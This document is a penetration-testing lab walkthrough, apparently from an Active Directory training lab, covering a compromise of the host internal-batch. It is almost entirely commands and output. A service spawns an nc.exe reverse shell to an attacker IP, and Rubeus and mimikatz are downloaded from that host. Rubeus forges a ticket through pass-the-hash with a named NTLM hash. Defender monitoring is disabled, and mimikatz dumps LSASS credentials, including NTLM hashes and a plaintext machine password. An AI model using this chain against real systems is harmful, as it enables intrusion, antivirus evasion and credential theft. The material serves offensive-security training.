---
layout: default
---

## internal-batch 192.168.250.177

In order to access to this machine I followed the attack_path 1:
```
	- it-sqlsrv02.it.gcb.local
	- msp-sqlreport.msp.local
	- msp-sqlsrv01.msp.local (PSWA port-proxy)
```

From msp-sqlsrv01.msp.local it's required create a new session with nt Authority system in order to expand a new reverse shell to the attacker it-employee15 machine.

### 1. Reverse shell from msp-srv01

create and launch service:
```
PS C:\Users\mspdb\Documents> 
cmd /c sc create REVERSE binPath= "cmd /c C:\Users\mspdb\Documents\nc.exe -e cmd 192.168.100.15 443"
[SC] CreateService SUCCESS
PS C:\Users\mspdb\Documents> 
cmd /c sc start REVERSE
```

```*
PS C:\tools> Import-Module C:\tools\powercat.ps1
PS C:\tools> powercat -l -p 443 -v -t 9999
VERBOSE: Set Stream 1: TCP
VERBOSE: Set Stream 2: Console
VERBOSE: Setting up Stream 1...
VERBOSE: Listening on [0.0.0.0] (port 443)
VERBOSE: Connection from [192.168.250.22] port  [tcp] accepted (source port 50314)
VERBOSE: Setting up Stream 2...
VERBOSE: Both Communication Streams Established. Redirecting Data Between Streams...
whoami
Microsoft Windows [Version 10.0.17763.5458]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>hostname
hostname
msp-srv01

C:\Windows\system32>powershell -ep bypass
powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> cd C:\
cd C:\
PS C:\> wget http://192.168.100.15/Rubeus.exe -OutFile Rubeus.exe
wget http://192.168.100.15/Rubeus.exe -OutFile Rubeus.exe
```


### 2. Impersonate user batchsvc from internal.msp.local

```
PS C:\> .\Rubeus.exe asktgt /domain:internal.msp.local /user:batchsvc /ntlm:10ee9d3f6da987cac9357548fadb7f7b /ptt
.\Rubeus.exe asktgt /domain:internal.msp.local /user:batchsvc /ntlm:10ee9d3f6da987cac9357548fadb7f7b /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 10ee9d3f6da987cac9357548fadb7f7b
[*] Building AS-REQ (w/ preauth) for: 'internal.msp.local\batchsvc'
[*] Using domain controller: 192.168.250.2:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
      aW50ZXJuYWwubXNwLmxvY2Fs
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/internal.msp.local
  ServiceRealm             :  INTERNAL.MSP.LOCAL
  UserName                 :  batchsvc
  UserRealm                :  INTERNAL.MSP.LOCAL
  StartTime                :  7/23/2024 10:14:35 AM
  EndTime                  :  7/23/2024 8:14:35 PM
  RenewTill                :  7/30/2024 10:14:35 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  pyL1Yi1rUyhOE2ekS6XbQg==
  ASREP (key)              :  10EE9D3F6DA987CAC9357548FADB7F7B

``` 

### 3. Access to target internal-batch.internal.msp.local machine with local administrator privileges:

```
PS C:\> Enter-PSSession -ComputerName internal-batch.internal.msp.local
Enter-PSSession -ComputerName internal-batch.internal.msp.local
[internal-batch.internal.msp.local]: PS C:\Users\batchsvc\Documents> whoami
whoami
internalmsp\batchsvc
[internal-batch.internal.msp.local]: PS C:\Users\batchsvc\Documents> hostname
hostname
internal-batch
[internal-batch.internal.msp.local]: PS C:\Users\batchsvc\Documents> ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::7420:6c2c:603e:a98c%4
   IPv4 Address. . . . . . . . . . . : 192.168.250.177
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.250.254
```

### 4. Disable AV and dump hashes from Lsass process

```
[internal-batch.internal.msp.local]: PS C:\Users\batchsvc\Documents> powershell -c Set-MpPreference -DisableRealTimeMonitoring 1
powershell -c Set-MpPreference -DisableRealTimeMonitoring 1
[internal-batch.internal.msp.local]: PS C:\Users\batchsvc\Documents> powershell -c wget http://192.168.100.15/mimikatz.exe -OutFile C:\mimikatz.exe
powershell -c wget http://192.168.100.15/mimikatz.exe -OutFile C:\mimikatz.exe
[internal-batch.internal.msp.local]: PS C:\Users\batchsvc\Documents> powershell -c C:\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonPasswords" "exit"
powershell -c C:\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonPasswords" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

600     {0;000003e7} 1 D 20154          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;032a862c} 0 D 53284620    INTERNALMSP\batchsvc    S-1-5-21-2754435719-1041067879-922430489-1120   (09g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 53338273    NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz(commandline) # sekurlsa::logonPasswords

Authentication Id : 0 ; 1895497 (00000000:001cec49)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/29/2024 12:05:49 AM
SID               : S-1-5-96-0-2
        msv :
         [00000003] Primary
         * Username : INTERNAL-BATCH$
         * Domain   : INTERNALMSP
         * NTLM     : 39b26b30b7c9d8e27f225e3afcffcfcf
         * SHA1     : 42869d37013f081fc6425d8eca712f755410144f
         * DPAPI    : 42869d37013f081fc6425d8eca712f75
        tspkg :
        wdigest :
         * Username : INTERNAL-BATCH$
         * Domain   : INTERNALMSP
         * Password : (null)
        kerberos :
         * Username : INTERNAL-BATCH$
         * Domain   : internal.msp.local
         * Password : xEHH>XU_1F?YRUbQbD'W/<q[\*R>#N/$zJLF\A<vlpeR^BsMfW4DM;Z:BKj]9:&0FKBZiP`4;1IA;zL1!ML2req_5;!DJ<d]'8BbbzndEhFabeak.9CYm]FW
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : INTERNAL-BATCH$
Domain            : INTERNALMSP
Logon Server      : (null)
Logon Time        : 4/28/2024 11:45:53 PM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : INTERNAL-BATCH$
         * Domain   : INTERNALMSP
         * NTLM     : 39b26b30b7c9d8e27f225e3afcffcfcf
         * SHA1     : 42869d37013f081fc6425d8eca712f755410144f
         * DPAPI    : 42869d37013f081fc6425d8eca712f75
        tspkg :
        wdigest :
         * Username : INTERNAL-BATCH$
         * Domain   : INTERNALMSP
         * Password : (null)
        kerberos :
         * Username : internal-batch$
         * Domain   : INTERNAL.MSP.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 26484 (00000000:00006774)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/28/2024 11:45:52 PM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : INTERNAL-BATCH$
         * Domain   : INTERNALMSP
         * NTLM     : 39b26b30b7c9d8e27f225e3afcffcfcf
         * SHA1     : 42869d37013f081fc6425d8eca712f755410144f
         * DPAPI    : 42869d37013f081fc6425d8eca712f75
        tspkg :
        wdigest :
         * Username : INTERNAL-BATCH$
         * Domain   : INTERNALMSP
         * Password : (null)
        kerberos :
         * Username : INTERNAL-BATCH$
         * Domain   : internal.msp.local
         * Password : xEHH>XU_1F?YRUbQbD'W/<q[\*R>#N/$zJLF\A<vlpeR^BsMfW4DM;Z:BKj]9:&0FKBZiP`4;1IA;zL1!ML2req_5;!DJ<d]'8BbbzndEhFabeak.9CYm]FW
        ssp :
        credman :

Authentication Id : 0 ; 48410569 (00000000:02e2afc9)
Session           : Interactive from 4
User Name         : UMFD-4
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 7/3/2024 8:54:19 PM
SID               : S-1-5-96-0-4
        msv :
         [00000003] Primary
         * Username : INTERNAL-BATCH$
         * Domain   : INTERNALMSP
         * NTLM     : 39b26b30b7c9d8e27f225e3afcffcfcf
         * SHA1     : 42869d37013f081fc6425d8eca712f755410144f
         * DPAPI    : 42869d37013f081fc6425d8eca712f75
        tspkg :
        wdigest :
         * Username : INTERNAL-BATCH$
         * Domain   : INTERNALMSP
         * Password : (null)
        kerberos :
         * Username : INTERNAL-BATCH$
         * Domain   : internal.msp.local
         * Password : xEHH>XU_1F?YRUbQbD'W/<q[\*R>#N/$zJLF\A<vlpeR^BsMfW4DM;Z:BKj]9:&0FKBZiP`4;1IA;zL1!ML2req_5;!DJ<d]'8BbbzndEhFabeak.9CYm]FW
        ssp :
        credman :

Authentication Id : 0 ; 43461438 (00000000:02972b3e)
Session           : Interactive from 1
User Name         : Administrator
Domain            : INTERNAL-BATCH
Logon Server      : INTERNAL-BATCH
Logon Time        : 6/27/2024 8:12:08 AM
SID               : S-1-5-21-4118483596-3130380053-696419714-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : INTERNAL-BATCH
         * NTLM     : 6b4c20a49a26c4dabbbb29c6842e4f4d
         * SHA1     : 3beaaaaebcf5ca12e95ccf4ffb2ac517804b681b
         * DPAPI    : 3beaaaaebcf5ca12e95ccf4ffb2ac517
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : INTERNAL-BATCH
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : INTERNAL-BATCH
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 1957531 (00000000:001dde9b)
Session           : RemoteInteractive from 2
User Name         : batchsvc
Domain            : INTERNALMSP
Logon Server      : INTERNAL-DC01
Logon Time        : 4/29/2024 12:06:05 AM
SID               : S-1-5-21-2754435719-1041067879-922430489-1120
        msv :
         [00000003] Primary
         * Username : batchsvc
         * Domain   : INTERNALMSP
         * NTLM     : 10ee9d3f6da987cac9357548fadb7f7b
         * SHA1     : 8a3f3fe9b212276e91435ca655b4a323195c4c12
         * DPAPI    : 6c97f11d2820a2c4fdd00e11f7304f53
        tspkg :
        wdigest :
         * Username : batchsvc
         * Domain   : INTERNALMSP
         * Password : (null)
        kerberos :
         * Username : batchsvc
         * Domain   : INTERNAL.MSP.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 4/28/2024 11:45:53 PM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 26575 (00000000:000067cf)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/28/2024 11:45:52 PM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : INTERNAL-BATCH$
         * Domain   : INTERNALMSP
         * NTLM     : 39b26b30b7c9d8e27f225e3afcffcfcf
         * SHA1     : 42869d37013f081fc6425d8eca712f755410144f
         * DPAPI    : 42869d37013f081fc6425d8eca712f75
        tspkg :
        wdigest :
         * Username : INTERNAL-BATCH$
         * Domain   : INTERNALMSP
         * Password : (null)
        kerberos :
         * Username : INTERNAL-BATCH$
         * Domain   : internal.msp.local
         * Password : xEHH>XU_1F?YRUbQbD'W/<q[\*R>#N/$zJLF\A<vlpeR^BsMfW4DM;Z:BKj]9:&0FKBZiP`4;1IA;zL1!ML2req_5;!DJ<d]'8BbbzndEhFabeak.9CYm]FW
        ssp :
        credman :

Authentication Id : 0 ; 24975 (00000000:0000618f)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 4/28/2024 11:45:51 PM
SID               :
        msv :
         [00000003] Primary
         * Username : INTERNAL-BATCH$
         * Domain   : INTERNALMSP
         * NTLM     : 39b26b30b7c9d8e27f225e3afcffcfcf
         * SHA1     : 42869d37013f081fc6425d8eca712f755410144f
         * DPAPI    : 42869d37013f081fc6425d8eca712f75
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : INTERNAL-BATCH$
Domain            : INTERNALMSP
Logon Server      : (null)
Logon Time        : 4/28/2024 11:45:51 PM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : INTERNAL-BATCH$
         * Domain   : INTERNALMSP
         * Password : (null)
        kerberos :
         * Username : internal-batch$
         * Domain   : INTERNAL.MSP.LOCAL
         * Password : (null)
        ssp :
        credman :

mimikatz(commandline) # exit
Bye!
```


[back](./section2.html)
